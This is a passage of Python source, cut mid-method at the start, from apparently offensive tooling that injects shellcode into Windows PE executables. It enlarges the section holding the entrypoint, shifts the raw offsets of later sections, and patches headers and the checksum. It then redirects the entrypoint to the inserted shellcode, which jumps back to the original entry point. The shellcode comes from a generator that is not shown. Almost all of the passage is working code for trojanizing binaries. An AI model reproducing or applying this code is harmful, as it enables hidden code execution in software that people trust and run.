        section_header_index_and_offset = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary_data, header_offset, entrypoint_rva)
        offset_of_header_of_section_containing_entrypoint = section_header_index_and_offset [1]


        # Set raw section size for shellcoded section
        raw_section_size_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER
        raw_section_size = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_section_size_offset)
        raw_section_size += len(self.shell_code)
        MultiByteHandler.set_dword_given_offset(self.binary_data, raw_section_size_offset, raw_section_size)

        # Set virtual section size for shellcoded section
        virtual_section_size_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER
        virtual_section_size = MultiByteHandler.get_dword_given_offset(self.binary_data, virtual_section_size_offset)
        virtual_section_size += len(self.shell_code)
        MultiByteHandler.set_dword_given_offset(self.binary_data, virtual_section_size_offset, virtual_section_size)

        number_of_sections_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_SECTIONS
        number_of_sections = MultiByteHandler.get_word_given_offset(self.binary_data, number_of_sections_offset)
        remaining_sections_after_shell_code_section = number_of_sections - (section_header_index_and_offset[0] + 1)

        # Moving to the next section header
        current_section_header_offset = offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER

        for section_index in range(0, remaining_sections_after_shell_code_section):
            if self.rva_delta != 0:
                virtual_section_rva_offset = current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER
                virtual_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
                virtual_section_rva = (virtual_section_rva + self.rva_delta) if virtual_section_rva != 0 else 0
                MultiByteHandler.set_dword_given_offset(self.binary_data, virtual_section_rva_offset, virtual_section_rva)

            raw_section_offset_offset =  current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER
            raw_section_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_section_offset_offset)
            raw_section_offset = (raw_section_offset + len(self.shell_code)) if raw_section_offset !=0 else 0
            MultiByteHandler.set_dword_given_offset(self.binary_data, raw_section_offset_offset, raw_section_offset)

            current_section_header_offset += Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER

    def __update_checksum(self, header_offset):

        checksum_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CHECKSUM
        checksum = Win32BinaryUtils.compute_checksum(self.binary_data, header_offset)
        MultiByteHandler.set_dword_given_offset(self.binary_data, checksum_offset, checksum)


    def __set_rva_delta_for_section_alignment(self, raw_offset_of_header_of_section_containing_entrypoint):
        """
        :param raw_offset_of_header_of_section_containing_entrypoint:
        :return: This class returns nothing. It is meant to check if it is possible to write the shellcode between the end of the virtual section for
        the entrypoint and the beginning of the virtual section coming next.
        """

        rva_for_entrypoint_section = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
        virtual_size_of_entrypoint_section = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_VIRTUAL_SIZE_WITHIN_SECTION_HEADER)
        minimum_rva_for_next_section = (rva_for_entrypoint_section + virtual_size_of_entrypoint_section + len(self.shell_code))

        # Next section RVA
        next_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)

        if minimum_rva_for_next_section < next_section_rva:
            self.rva_delta = 0
            return
        else:
            #I should probably throw a custom exception here.
            print("RVA at the end of shellcode crosses next section RVA. This will not work. Leaving.")
            sys.exit(1)

        '''
        This used to be uncommented. I cannot move the RVAs. It will break the code. Yet, i am keeping this here.

        #virtual_rva_delta = Win32BinaryUtils.compute_padding_size_for_section_alignment(self.binary_data, header_offset, minimum_rva_for_next_section)
        # Only the RVA for the shellcode section is affected.

         #if virtual_rva_delta != 0x0:
         #    self.rva_delta = (minimum_rva_for_next_section + virtual_rva_delta - next_section_rva)

        '''


    def __file_align_shellcode(self, header_offset, raw_offset_of_header_of_section_containing_entrypoint, entrypoint_raw_section_size, jump_displacement):

        """

        :param header_offset:
        :param raw_offset_of_header_of_section_containing_entrypoint:
        :param entrypoint_raw_section_size:
        :param jump_displacement: this is the difference between the RVA for the shellcode and the rva for the endpoint. This is used to create shellcode
        with a negative jump, i.e., the shellcode executes and then jumps to the entrypoint.
        :return: This function is used to create a parametrized and padded shellcode.
        """

        default_shell_code = self.shell_code_generator.get_base_shell_code(jump_displacement)
        raw_offset_of_entrypoint_section =  MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER)
        minimum_raw_offset_for_next_section = raw_offset_of_entrypoint_section + entrypoint_raw_section_size + len(default_shell_code)
        padding_size = Win32BinaryUtils.compute_padding_size_for_file_alignment(self.binary_data, header_offset, minimum_raw_offset_for_next_section)
        padded_shell_code = self.shell_code_generator.get_padded_shell_code(padding_size)
        self.shell_code = padded_shell_code

    def __append_data_at_offset(self, data, offset):
        first_half = self.binary_data[0:offset]
        second_half = self.binary_data[offset:]
        first_half.extend(data)
        first_half.extend(second_half)
        self.binary_data = first_half

    def __overwrite_entrypoint_rva(self, header_offset, shell_code_rva):

        # Get current RVA for entrypoint
        offset_for_address_of_entrypoint_rva_on_the_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA

        # Overwrite current RVA for entrypoint with the new one. Not sure if i should change BaseOfCode???
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_for_address_of_entrypoint_rva_on_the_header, shell_code_rva)

        # Adjust BaseOfCode
        # MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA, rva_for_shell_code_section_header)

    def modify_binary(self):

        header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)

        #We must get the offsets for the location where the shellcode will be inserted before inserting it and before changing the headers.
        entrypoint_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA)
        raw_offset_of_header_of_section_containing_entrypoint = Win32BinaryUtils.get_raw_offset_for_header_of_section_containing_given_rva(self.binary_data, header_offset, entrypoint_rva)[1]

        entrypoint_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)

        entrypoint_raw_section_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER)
        entrypoint_raw_section_size = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_of_header_of_section_containing_entrypoint + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_SIZE_WITHIN_SECTION_HEADER)

        rva_for_shell_code = entrypoint_section_rva + entrypoint_raw_section_size
        self.__file_align_shellcode(header_offset, raw_offset_of_header_of_section_containing_entrypoint, entrypoint_raw_section_size, entrypoint_rva - rva_for_shell_code)
        self.__set_rva_delta_for_section_alignment(raw_offset_of_header_of_section_containing_entrypoint)

        self.__adjust_data_directories(header_offset)
        self.__adjust_section_headers(header_offset)
        self.__adjust_standard_coff_fields(header_offset)
        self.__append_data_at_offset(self.shell_code, entrypoint_raw_section_offset + entrypoint_raw_section_size)
        self.__adjust_windows_specific_headers(header_offset)

        # Redirect execution to shellcode
        self.__overwrite_entrypoint_rva(header_offset, rva_for_shell_code + self.rva_delta)

        self.__update_checksum(header_offset)
        return self.binary_data



    def __init__(self, binary_data, shell_code_generator):
        self.shell_code = None
        self.binary_data = binary_data
        self.shell_code_generator = shell_code_generator
        self.rva_delta = 0

